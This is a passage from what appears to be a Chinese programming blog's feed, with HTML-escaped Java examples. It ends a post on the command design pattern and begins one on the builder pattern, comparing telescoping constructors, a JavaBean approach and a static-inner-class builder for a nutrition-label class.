caches&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>e&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 执行中间件任务
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">executeJobs&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Command cache &lt;span style="color:#f92672">:&lt;/span> caches&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
cache&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">execute&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 命令客户端
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CommandClient&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
CommandInvoker commandInvoker &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> CommandInvoker&lt;span style="color:#f92672">();&lt;/span>
Command commandMail &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MAIL&lt;span style="color:#f92672">();&lt;/span>
Command commandSms &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMS&lt;span style="color:#f92672">();&lt;/span>
commandInvoker&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">addCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>commandMail&lt;span style="color:#f92672">);&lt;/span>
commandInvoker&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">addCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>commandSms&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">//TODO add command in futrue on pg run
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
commandInvoker&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">executeJobs&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">设置邮件附件
设置邮件内容
设置邮件标题
发送邮件
设置短信内容
发送短信
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="问题回顾">问题回顾&lt;/h4>
&lt;p>总算完成了。最后再回顾一下之前出现的重大问题，看看是否这些问题都通过命令设计模式都得到了解决&lt;/p>
&lt;blockquote>
&lt;p>请求与执行的耦合度很高。假设需要再增加一个推送 app
消息的业务，那么你的代码很快就会陷入 if else 的海洋。&lt;/p>
&lt;/blockquote>
&lt;p>通过将请求封装为命令，解耦了请求者与执行者。当有新需求时，新的请求只需要实现命令接口，就能被我们的代码所复用。&lt;/p>
&lt;blockquote>
&lt;p>类没有对扩展开发，对修改关闭。当需求变化时我们仅仅能够通过修改代码来应对。&lt;/p>
&lt;/blockquote>
&lt;p>需求有变化时，通过 setCommand() / addCommand() 方法实现了对扩展开放，对修改关闭。&lt;/p>
&lt;blockquote>
&lt;ol start="3">
&lt;li>executeJobs() 是一个典型的依赖具体对象，而不是接口或抽象的失败案例。&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>现在依赖的是 Command 接口对象。&lt;/p>
&lt;blockquote>
&lt;p>如果我们想要将发送给某 1 个用户的消息一起执行，应该怎么办？&lt;/p>
&lt;/blockquote>
&lt;p>将所需要的任务组合成为一个新的 commandMacro 宏对象。宏对象持有一个 command 对象的数组。并在 execute 中调用数组中所有对象的 execute 方法，就能实现这样的需求。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>命令设计模式通过一个中间人/件将请求封装为统一的命令，达到了与命令的执行者之间实现解耦的目的。这样的设计使得中间人的代码尽可能的简单，并且能够与任意的对象组合。完整的命令设计模式还拥有 undo，撤销上一次命令的功能。
你可以试着自己来实现这个功能来加深对命令设计模式的理解。&lt;/p></description></item><item><title>建造者设计模式</title><link>https://www.chucklin.net/post/builder_designmode/</link><pubDate>Fri, 12 Jan 2018 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/builder_designmode/</guid><description>&lt;h2 id="什么是建造者设计模式">什么是建造者设计模式&lt;/h2>
&lt;p>建造者设计模式是将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示的一种手段。
建造者设计模式是创建者模式之一。建造者模式往往用来和工厂设计模式做类比，因为这两种设计模式在设计思路上有很相似的地方。
不过需要注意的是，搞清楚这两者的区别非常重要。当理解了两种设计模式对应的问题场景，以及分别用来解决什么样的问题以后，才算真正掌握了建造者设计模式。&lt;/p>
&lt;h2 id="建造者设计模式怎么用">建造者设计模式怎么用？&lt;/h2>
&lt;p>设想这样一个业务场景。
你需要设计一个类，这个类需要表示某个食品的外包装，外包装上需要显示这个食品所含有的成分。而每个食品含有的成分不同，并且有些成分是必然会印刷到包装上的，而有些成分则是某些食品所独有的。你应该怎么做？&lt;/p>
&lt;p>分析上述问题，由于食品品种不同，成分不同，所以食品包装类中含有必须，非必须的成分字段。面对这样的问题，最容易想到的就是重叠构造器模式。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#f92672">package&lt;/span> builder&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 建造者设计模式
&lt;/span>&lt;span style="color:#75715e"> * 包装食品标签类(不可变)
&lt;/span>&lt;span style="color:#75715e"> * 标签中拥有2个必选参数,3个可选参数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">NutritionFacts&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 必选
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 可选
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 只有calories可选参数的构造器
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param servingSize
&lt;/span>&lt;span style="color:#75715e"> * @param servings
&lt;/span>&lt;span style="color:#75715e"> * @param calories
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">NutritionFacts&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servingSize&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">calories&lt;/span> &lt;span style="color:#f92672">=&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sodium&lt;/span> &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 构造器
&lt;/span>&lt;span style="color:#75715e"> * 无sodium条件的构造器
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param servingSize
&lt;/span>&lt;span style="color:#75715e"> * @param servings
&lt;/span>&lt;span style="color:#75715e"> * @param calories
&lt;/span>&lt;span style="color:#75715e"> * @param fat
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">NutritionFacts&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> fat&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servingSize&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">calories&lt;/span> &lt;span style="color:#f92672">=&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sodium&lt;/span> &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 构造器
&lt;/span>&lt;span style="color:#75715e"> * 满足所有条件的构造器
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param servingSize
&lt;/span>&lt;span style="color:#75715e"> * @param servings
&lt;/span>&lt;span style="color:#75715e"> * @param calories
&lt;/span>&lt;span style="color:#75715e"> * @param fat
&lt;/span>&lt;span style="color:#75715e"> * @param sodium
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">NutritionFacts&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> fat&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> sodium&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servingSize&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">calories&lt;/span> &lt;span style="color:#f92672">=&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sodium&lt;/span> &lt;span style="color:#f92672">=&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 客户端测试
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param args
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 非常难以阅读的代码.完全无法知道参数是什么,而且容易传错参数.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> NutritionFacts nf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NutritionFacts&lt;span style="color:#f92672">(&lt;/span>1&lt;span style="color:#f92672">,&lt;/span> 2&lt;span style="color:#f92672">,&lt;/span> 3&lt;span style="color:#f92672">,&lt;/span> 0&lt;span style="color:#f92672">,&lt;/span> 5&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>重叠构造器很容易理解。我们为食品包装类设计了复数个构造器，每个构造器，都拥有必须持有的两个字段。而每一个构造器都比上一个构造器多出一个可选字段。这样用户就可以根据需要，调用不同的构造器创建不同的对象了。&lt;/p>
&lt;p>重叠构造器能够解决问题，但是却有一个重大的缺陷：代码非常难以阅读，用户也相当难以使用这样的类。
原因很简单，用户在使用这样的类时，需要仔细去阅读 doc（如果有的话），还需要搞清楚到底哪个是可选哪个是必选。最后在创建对象时传参更是要小心翼翼-稍不注意，就会造成参数传递错误，并且是运行时错误，得不到任何检查。
在本例中只拥有 6 个成员变量的类还算勉强可以接受，但假设这个类的成员变量膨胀到 20 个，那么通过这种方式创建这种类的对象的体验实在是太糟糕了。&lt;/p>
&lt;p>如何让参数传递既安全，代码又易读呢？
假设我们将大量参数分装为一个 javaBean，创建对象时，通过 getSet 方法来设值是否是一个可行的方法？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#f92672">package&lt;/span> builder&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 建造者设计模式
&lt;/span>&lt;span style="color:#75715e"> * 包装食品标签类(可变)
&lt;/span>&lt;span style="color:#75715e"> * 标签中拥有2个必选参数,3个可选参数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">NutritionFactsBeanMode&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 必选
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 可选
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 构造器
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param servingSize
&lt;/span>&lt;span style="color:#75715e"> * @param servings
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">NutritionFactsBeanMode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servingSize&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getServingSize&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getServings&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getCalories&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setCalories&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">calories&lt;/span> &lt;span style="color:#f92672">=&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getFat&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setFat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> fat&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getSodium&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setSodium&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> sodium&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sodium&lt;/span> &lt;span style="color:#f92672">=&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 客户端测试
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param args
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
NutritionFactsBeanMode nf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NutritionFactsBeanMode&lt;span style="color:#f92672">();&lt;/span>
nf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setFat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>1&lt;span style="color:#f92672">);&lt;/span>
nf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setSodium&lt;/span>&lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">);&lt;/span>
nf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setCalories&lt;/span>&lt;span style="color:#f92672">(&lt;/span>3&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>JavaBean 模式似乎用非常简单的方法解决了问题。但是却引发了一个致命的缺陷。食品包装对象从一个不可变对象成为了一个可变对象。在并发的逻辑中，你就不得不花心思在它的同步处理上面。这真是有点得不偿失的感觉。&lt;/p>
&lt;p>那么创建这样的较复杂对象，有没有办法写出又安全，阅读性又强，用户又易用的代码呢？
答案当然是有。结合静态内部类的创建者模式就是用来解决这样的问题的。
改进一下上例的 bean 模式，我们将 bean 改为不可变类，并且不允许外部创建对象。接下来通过创建内部的建造者对象，再调用建造方法来建造外部对象。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#f92672">package&lt;/span> builder&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 建造者设计模式
&lt;/span>&lt;span style="color:#75715e"> * 包装食品标签类(不可变)
&lt;/span>&lt;span style="color:#75715e"> * 标签中拥有2个必选参数,3个可选参数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">NutritionFactsBuilderPattern&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 所有的外部类中的字段都是final的,保证线程安全.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 必选
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 可选
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 构造器
&lt;/span>&lt;span style="color:#75715e"> * 根据内部建造者的参数来初始化对象
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param builder
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">NutritionFactsBuilderPattern&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Builder builder&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servingSize&lt;/span> &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servingSize&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servings&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
